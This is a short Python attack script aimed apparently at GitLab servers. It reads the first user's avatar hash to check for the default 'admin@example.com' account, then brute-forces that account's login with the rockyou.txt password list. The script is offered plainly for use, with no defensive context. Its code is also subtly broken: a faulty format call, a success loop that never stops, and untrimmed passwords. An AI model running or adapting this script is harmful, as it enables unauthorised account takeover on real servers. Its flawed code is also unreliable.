from hashlib import md5
from re import findall

from requests import get, post
from tqdm import tqdm


domain = ''

r = get(domain+'/api/v4/users/1').json()
email = findall('([a-z0-9]{32})', r['avatar_url'])[0]

a = True if str((md5("admin@example.com".encode())).hexdigest()) == str(email) else False

if a:
    print("Standart user found, trying brute...")
    with open('rockyou.txt', 'r') as f:
        for i in tqdm(f.readlines()):
            tmp = post(domain+'/users/sign_in', data={'user_login':'admin@example.com', 'user_password':i}).text
            if 'Invalid Login or password.' not in tmp:
                print("Success! Password: {i}".format(i))
        else:
            print('No password found :(')
else:
    print("Standart user not found.")
